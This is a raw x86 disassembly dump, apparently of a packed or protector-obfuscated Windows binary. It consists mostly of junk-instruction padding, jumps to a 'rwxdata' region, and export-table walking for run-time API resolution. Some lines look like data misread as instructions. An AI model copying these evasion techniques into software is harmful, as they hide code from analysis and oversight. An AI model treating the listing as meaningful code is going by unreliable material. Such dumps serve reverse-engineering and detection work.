mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
dec ebp
mov esp 0x7488b98a
scasd [ edi ]
rcl [ eax ] cl
fisub [ 0xffffffff920b8020 ]
xchg esi eax
push esp
push ds
inc ebx
and [ eax + 0x5027b445 ] ecx
sbb bl [ edx ]
sbb eax 0xd20ce45
in al 0xa7
mov [ edx - 0x7aadbf64 ] ebp
cmp ebx edx
xor esp edx
or cl dh
adc dl [ ecx + 0x52 ]
shr edx cl
popfd
jno rwxdata
jle rwxdata
leave
adc dl bl
lodsb [ esi ]
jecxz rwxdata
out dx eax
and eax 0x6073dfda
xlat
call 0xffffffffe7ac3008
sbb ecx edx
adc [ ecx - 0x54b906bc ] dl
cmpsb [ esi ] [ edi ]
mov ebp 0x7a2bb018
movsb [ edi ] [ esi ]
idiv [ ecx ]
jl rwxdata
sub edi [ edx - 0x5c ]
cmpsd [ esi ] [ edi ]
xchg ecx eax
or [ edx ] ch
xchg ecx eax
xchg ebx eax
dec edi
mov dl [ ebx + 0x317031a5 ]
clc
imul ebp edi 0x25
cmp [ edx + 0x52 ] ecx
nop ebx ebp
inc esi
xor bh cl
outsb
jpe rwxdata
sub_4d786c
pushad
jmp rwxdata
mov [ esp + 0x20 ] esi
movsx esi al
btc si 0xa
mov esi edi
cmc
cmp al 0x8c
cmc
push 0x850950ce
sub esi eax
push 0xc1f4ee66
jmp rwxdata
[ edi ] [ esi ]
push 0x4ded081d
lea esi [ eax - 0x1b64fa2b ]
call sub_249986
lodsb [ esi ]
lea ebp [ edx - 0x42ce3da7 ]
or edi ebx
fisttp [ edx - 0x71 ]
mov edx 0x3a9d66cd
add al 0x95
mov edi 0xc67c7f88
inc ebx
mov dl 0xfe
pop ebx
stosb [ edi ]
cmp eax 0x9b9263f2
push 0xfffffffb
or bh [ esi - 0x473a6ae7 ]
jmp rwxdata
pop ebx
sub_4d794b
bswap bx
mov ebx eax
lea edi [ esp - 0x581f082d ]
movzx di cl
mov edi eax
pushad
mov [ esp ] 0x66b6a9a0
mov [ esp ] dl
lea esp [ esp + 0x24 ]
jmp rwxdata
bts cx 0xb
rol cl 0x2
shr cl 0x1
mov ecx 0x104
cmp dl dl
push eax
pushad
sub al al
cmp sp dx
[ edi ]
mov [ esp ] esi
lea esp [ esp + 0x24 ]
js rwxdata
push ebx
call sub_4fd5ab
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror ecx cl
sub si 0x68b9
mov ecx edi
cmc
or esi edi
mov si 0x84bb
bts esi esi
sub ecx ebx
btr si bp
clc
mov esi esp
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sub_4d7a78
rol al 0x7
clc
cmp cl al
shl bl 0x7
bt dx si
add al 0x0
or bl 0x5a
not bl
neg bl
cmp al 0xf6
not al
sbb bl ah
and bl cl
adc bl 0xbb
sub al 0x34
mov [ esp ] ah
stosb [ edi ]
pushfd
mov bl 0x2
lea esp [ esp + 0x8 ]
pushfd
call sub_4fd3de
sub [ ecx ] al
scasb [ edi ]
nop
and [ ebx ] esp
or al [ ecx - 0x5c ]
lea ebp [ esp + edi * 4 + 0x2f5c6dff ]
xor bh al
sub_4d7c22
push 0xf1186c66
mov [ esp ] 0xfb
lea esp [ esp + 0x10 ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
stc
bt edi 0x15
cmp cl 0x8a
cmp eax [ ebp - 0x10 ]
pushfd
pushfd
pushfd
pushfd
lea esp [ esp + 0x10 ]
jae rwxdata
push 0x53afbdc3
bswap bx
mov ebx eax
movzx di al
pushad
not edi
pushad
mov edi eax
push 0xfcd397a3
mov [ esp + 0x4 ] 0xdb41
lea esp [ esp + 0x48 ]
jmp rwxdata
bts cx 0xb
rol cl 0x2
shr cl 0x1
mov ecx 0x104
cmp dl dl
push eax
pushad
sub al al
cmp sp dx
[ edi ]
mov [ esp ] esi
lea esp [ esp + 0x24 ]
js rwxdata
push ebx
call sub_4fd5ab
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
ror ecx cl
sub si 0x68b9
mov ecx edi
cmc
or esi edi
mov si 0x84bb
bts esi esi
sub ecx ebx
btr si bp
clc
mov esi esp
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sub_4d7c9a
sub esi eax
pushfd
pushad
pushfd
push 0x452166aa
[ edi ] [ esi ]
pushfd
mov esi [ esp + 0x34 ]
push [ esp + 0x10 ]
mov [ esp + 0x10 ] 0xb9307bf
mov [ esp + 0x4 ] 0xfd37
mov [ esp ] 0x1b22
lea esp [ esp + 0x3c ]
jmp rwxdata
pushfd
call sub_4fd3de
sub [ ecx ] al
scasb [ edi ]
nop
and [ ebx ] esp
or al [ ecx - 0x5c ]
lea ebp [ esp + edi * 4 + 0x2f5c6dff ]
xor bh al
sub_4d7f08
push 0x92bd10a
test al ah
cmp eax [ ebp - 0x10 ]
mov [ esp ] si
mov [ esp ] bh
jmp rwxdata
lea esp [ esp + 0x8 ]
jae rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
cmc
ror cl 0x1
mov ebx eax
lea ecx [ edi * 4 + 0x692090f7 ]
mov edi eax
sbb cl ah
mov ecx 0x104
bt ax 0x5
cmp bl 0xf3
xor al al
cmc
clc
cmc
jmp rwxdata
[ edi ]
pushad
mov [ esp ] dh
lea esp [ esp + 0x20 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
stc
xchg cx si
mov ecx edi
xor si ax
neg si
sub ecx ebx
cmc
inc esi
mov esi esp
test bh 0xef
jmp rwxdata
sub edi 0x4
bt bx 0x9
bt di 0xf
clc
push [ edi ]
test bh bh
cmp edi ebx
pushfd
lea esp [ esp + 0x4 ]
ja rwxdata
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
test esp edx
xor al dh
rol al 0x3
sub ebx edi
neg di
shrd di di 0x6
add ebx esp
dec al
shr di cl
test ax 0x7285
and al 0x3d
mov edi ebx
test ah 0xb
sets al
cmp ax 0x90fe
adc al 0x1d
mov al 0x2e
clc
[ edi ]
pushad
pushad
lea esp [ esp + 0x40 ]
jne rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
mov ah 0xb7
push ebp
push 0x88a3118e
pushfd
mov [ edi - 0x1 ] 0x0
lea eax [ ecx - 0x639669e1 ]
setle ah
mov [ esp + 0x8 ] ebx
call sub_4d47d4
sub_4d7fbd
lea esp [ esp + 0x34 ]
ja rwxdata
cmc
call sub_4fea6f
mov [ esp + 0x24 ] 0x47586ff8
push [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x71
pushfd
push eax
lea esp [ esp + 0x30 ]
jmp rwxdata
jmp rwxdata
pushfd
pushad
mov [ esp + 0x8 ] sp
mov [ esp + 0x20 ] ecx
call sub_512539
pushfd
jmp rwxdata
pushfd
lea esp [ esp + 0x8 ]
jb rwxdata
jmp rwxdata
clc
pushfd
cmp [ edi - 0x1 ] 0x0
push ecx
jmp rwxdata
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
jne rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
bsr edi esi
btr di si
mov edi [ edx + 0x24 ]
test esi 0xe4b698ce
pushad
test ah 0xfe
add edi eax
mov [ esp ] edi
test bl 0xe8
bt edi 0x1c
pushad
movzx ecx [ edi + ecx * 2 ]
bt sp 0x7
inc di
mov di cx
mov edi [ edx + 0x1c ]
cmp bl 0x95
clc
pushfd
add edi eax
pushfd
clc
cmc
mov edi [ edi + ecx * 4 ]
pushfd
cmc
test edi edi
mov [ esp ] cl
call j_sub_24bd45
dec edi
dec esp
inc ebp
inc ecx
push ebp
push esp
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax + eax * 8 - 0x2ddbfb3a ] al
pushfd
mov [ esp ] cl
call sub_4dd712
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
sub_4d842b
lea eax [ rwxdata ]
pushfd
mov [ esp ] 0xb1
call sub_247300
pushfd
pushfd
jmp rwxdata
lea esp [ esp + 0x28 ]
je rwxdata
bt di dx
or ah ah
push 0x13376c9e
lea esp [ esp + 0x4 ]
je rwxdata
stc
cmp al ah
call sub_4da2d3
mov edi [ edx + 0x1c ]
stc
add edi eax
cmp di 0x1c1b
stc
pushad
pushfd
mov edi [ edi + ecx * 4 ]
pushfd
push [ esp ]
test edi edi
jmp sub_4d6ea2
push ecx
jmp rwxdata
jo rwxdata
pushad
push [ esp + 0x24 ]
retn 0x28
clc
test bx si
pushfd
cmp ah 0x2e
pushad
pushfd
push [ esp + 0x28 ]
retn 0x2c
cmp ah 0x2e
sub_4d84ef
mov [ esp + 0x10 ] eax
movsx eax al
jmp rwxdata
mov [ esp + 0xc ] 0x0
pushad
push 0x67b798dd
lea eax [ LocalAlloc@IAT ]
pushfd
pushfd
mov [ esp + 0x34 ] rwxdata
mov [ esp ] 0x4334
push esi
mov [ esp ] 0xec2b54ef
call sub_4d7edd
sub_4d8704
cmp [ edi - 0x1 ] 0x0
mov [ esp ] 0x2c
lea esp [ esp + 0x4 ]
jne rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
ror di 0x7
add di si
sar edi cl
mov edi [ edx + 0x24 ]
cmc
push 0x1cb6fcfa
pushad
add edi eax
cmc
mov [ esp + 0xc ] al
push esp
movzx ecx [ edi + ecx * 2 ]
or di 0x2eb7
stc
sub di 0x92cb
mov edi [ edx + 0x1c ]
mov [ esp + 0x4 ] sp
call sub_24a695
pushfd
mov [ esp + 0x4 ] 0x2573f642
pushfd
mov [ esp ] 0xac
lea esp [ esp + 0x8 ]
jmp rwxdata
pushad
call sub_51306d
mov eax ebp
clc
clc
cmp dl 0xfa
jmp rwxdata
sub ebp 0x4
pushad
pushad
jmp rwxdata
push 0x2d3807c7
mov [ ebp ] eax
pushfd
push [ esp + 0x14 ]
lea esp [ esp + 0x50 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_4d8764
mov edi ebx
xor al 0x54
sar al 0x2
push [ esp + 0x4 ]
mov al 0x2e
bt bx 0x1
cmc
mov [ esp ] sp
mov [ esp ] 0x88
[ edi ]
mov [ esp + 0x4 ] 0x65
call sub_24a551
lea esp [ esp + 0xc ]
jne rwxdata
push eax
jmp rwxdata
setno cl
btc ecx eax
mov ecx [ ebx ]
push ecx
test bl bh
pushfd
or ecx ecx
mov [ esp ] sp
pushfd
push eax
call sub_24a8e8
in eax 0x46
lea esp [ edx - 0x54758179 ]
adc [ ebp + 0x7 ] 0x47
xor ch 0x66
popfd
mov [ 0x2e3dc651 ] al
lds esi [ esi - 0x73 ]
stosb [ edi ]
pop ecx
outsb
rol ch 0x1
clc
mov [ esp ] 0x84
xor eax eax
add esp 0x4
jmp rwxdata
or ebx ebx
jmp sub_4da277
sub_4d8aad
lea esp [ esp + 0x10 ]
ja rwxdata
and bl al
rol bl cl
xchg ebp eax
pushad
bswap eax
mov eax ebp
pushfd
neg bl
stc
sbb bl 0xb9
mov bl 0x1
add esp 0x24
test ah 0x6d
js rwxdata
pushfd
dec bl
setpo bl
call sub_4d29ba
and al 0xc3
call 0xffffffffd3637e33
push esi
xor ebx eax
xor al 0xd2
in eax 0xcd
sub esi edx
push esi
pushfd
cmp dl dl
xor bl [ edi ]
inc ecx
cmpsd [ esi ] [ edi ]
0x28c3eb2b 0x814
call sub_4d786c
clc
push esi
bsf si si
shrd si cx 0x5
mov esi edi
stc
stc
call sub_4d7c9a
lea esp [ esp + 0x28 ]
jne rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4d8d39
sub esi eax
pushfd
jmp rwxdata
[ edi ] [ esi ]
pushad
mov esi [ esp + 0x34 ]
mov [ esp ] 0x78
mov [ esp + 0x4 ] 0x6e
push [ esp + 0x4 ]
lea esp [ esp + 0x3c ]
jmp rwxdata
pushfd
call sub_4fd3de
sub [ ecx ] al
scasb [ edi ]
nop
and [ ebx ] esp
or al [ ecx - 0x5c ]
lea ebp [ esp + edi * 4 + 0x2f5c6dff ]
xor bh al
sub_4d8d4d
lea esp [ esp + 0x14 ]
call sub_4dd2bf
pushad
pushad
jmp rwxdata
lea esp [ esp + 0x40 ]
jne rwxdata
call sub_2493e2
movzx ax dl
pushad
pop eax
mov eax [ edx + 0x8 ]
push [ esp ]
mov [ esp + 0x10 ] si
lea esp [ esp + 0x20 ]
jmp rwxdata
jmp rwxdata
or ebx ebx
jmp sub_4da277
sub_4d9d27
mov [ esp + 0x4 ] 0xbd
test bh 0x4e
mov [ esp ] dl
or al al
mov [ esp ] al
lea esp [ esp + 0x8 ]
je rwxdata
bt di dx
or ah ah
push 0x13376c9e
lea esp [ esp + 0x4 ]
je rwxdata
pushad
mov [ esp ] cx
pushfd
clc
cmp al ah
mov [ esp + 0x4 ] 0xe
push [ esp ]
lea esp [ esp + 0x28 ]
jne rwxdata
push ecx
jmp rwxdata
jo rwxdata
push 0xc9f9579f
jmp rwxdata
pushad
push [ esp + 0x24 ]
retn 0x28
clc
test bx si
pushfd
cmp ah 0x2e
pushad
pushfd
push [ esp + 0x28 ]
retn 0x2c
cmp ah 0x2e
pushad
inc esi
jmp rwxdata
pushfd
inc edi
pushfd
pushfd
lea esp [ esp + 0x30 ]
jmp sub_4dd2bf
sub_4d9d66
mov [ esp ] 0x1798
jmp rwxdata
push [ esp + 0x4 ]
lea esp [ esp + 0xc ]
je rwxdata
setle cl
rol cl cl
stc
btr cx 0x3
mov edi edx
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
jmp sub_24c1e5
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4da277
je rwxdata
bswap bx
bswap edi
lea edi [ edx + 0x6089f565 ]
pop edi
bswap bx
pushfd
pushad
lea esi [ esp + 0x1399fa5a ]
mov esi [ esp + 0x24 ]
pop ebx
movsx bx bl
mov ebx [ esp + 0x24 ]
mov [ esp ] ah
mov esp ebp
bswap bp
call sub_4d9bed
and eax eax
jecxz rwxdata
movzx esi cl
bswap si
movzx si bl
mov esi eax
lea eax [ ebp - 0x5b38bd6e ]
pushfd
movzx eax dl
push edx
mov [ esp + 0x4 ] ebx
movsx ax cl
lea eax [ LocalFree@IAT ]
lea esp [ esp + 0x4 ]
jpo rwxdata
rol [ ebp * 2 + 0x903153d ] 0x1
mov esp 0x1e5d15a4
sahf
out 0xc al
xchg esp eax
mov ch 0x30
jo rwxdata
cmc
or al 0x67
jmp sub_4daba0
pushfd
pushfd
pushad
mov [ esp + 0x24 ] rwxdata
mov [ esp ] cl
pushfd
push [ eax ]
pop [ esp + 0x24 ]
pushfd
push esp
push [ esp + 0x4 ]
push [ esp + 0x30 ]
retn 0x34
das
xor [ ecx + 0x6b7ec378 ] dh
pavgw mm3 [ eax - 0x51 ]
iretd
pop ebp
dec edx
movsb [ edi ] [ esi ]
pop edx
xchg bl bh

sub_4da471
lea esp [ esp + 0x64 ]
ja rwxdata
cmc
call sub_4fea6f
mov [ esp + 0x24 ] 0x47586ff8
push [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x71
pushfd
push eax
lea esp [ esp + 0x30 ]
jmp rwxdata
push 0xe4a4787c
lea esp [ esp + 0x4 ]
jb rwxdata
pushfd
pushad
mov [ esp + 0x8 ] sp
mov [ esp + 0x20 ] ecx
call sub_512539
jmp rwxdata
call sub_4d8704
pushfd
lea esp [ esp + 0x4 ]
jb rwxdata
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0x4d
mov [ esp + 0x20 ] 0x49048032
jmp rwxdata
push 0x49048032
jmp rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
call sub_4dc242
push ecx
jmp rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
pushfd
mov [ esp + 0x4 ] 0x2573f642
pushfd
mov [ esp ] 0xac
lea esp [ esp + 0x8 ]
jmp rwxdata
pushad
call sub_51306d
mov eax ebp
clc
clc
cmp dl 0xfa
jmp rwxdata
sub ebp 0x4
pushad
pushad
jmp rwxdata
push 0x2d3807c7
mov [ ebp ] eax
pushfd
push [ esp + 0x14 ]
lea esp [ esp + 0x50 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_4da59e
push [ esp ]
push ecx
mov [ esp ] 0x1fcc8829
lea esp [ esp + 0x34 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
add si di
movsx si dl
movsx si cl
mov ecx edi
sub si 0xc81e
sub ecx ebx
bswap esi
cmc
inc si
bsr esi edx
mov esi esp
stc
cmp dx si
sub edi 0x4
call sub_4ddf5f
stc
mov ebx eax
pushfd
bt di dx
cmp [ edi ] 0x23
call j_sub_4d2f01
pushad
push [ esp + 0x24 ]
retn 0x28
sub_4da603
jmp rwxdata
lea esp [ esp + 0x28 ]
jne rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4da608
pushfd
pushad
jmp rwxdata
lea esp [ esp + 0x30 ]
je rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
call sub_24ae92
mov edi [ edi + ecx * 4 ]
stc
bt bx 0x7
test edi edi
pushad
call sub_4d6610
lahf
cwde
lea edi [ edi + 0x1 ]
movzx eax bl
movsx ax dl
not al
jmp rwxdata
pop eax
pushad
jmp rwxdata
lea esp [ esp + 0x20 ]
ja rwxdata
cmc
call sub_4fea6f
mov [ esp + 0x24 ] 0x47586ff8
push [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x71
pushfd
push eax
lea esp [ esp + 0x30 ]
jmp rwxdata
pushad
pushfd
pushfd
mov [ esp + 0x4 ] 0x561c
lea esp [ esp + 0x28 ]
jb rwxdata
pushfd
pushad
mov [ esp + 0x8 ] sp
mov [ esp + 0x20 ] ecx
call sub_512539
jmp rwxdata
cmp ch 0x18
stc
cmp [ edi - 0x1 ] 0x0
pushad
lea esp [ esp + 0x20 ]
jne rwxdata
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
dec di
shrd di cx cl
mov edi [ edx + 0x24 ]
jmp rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
stc
cmp ch ah
add edi eax
clc
pushad
cmp bl bh
movzx ecx [ edi + ecx * 2 ]
and edi ecx
call sub_24a46c
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
sub_4da60f
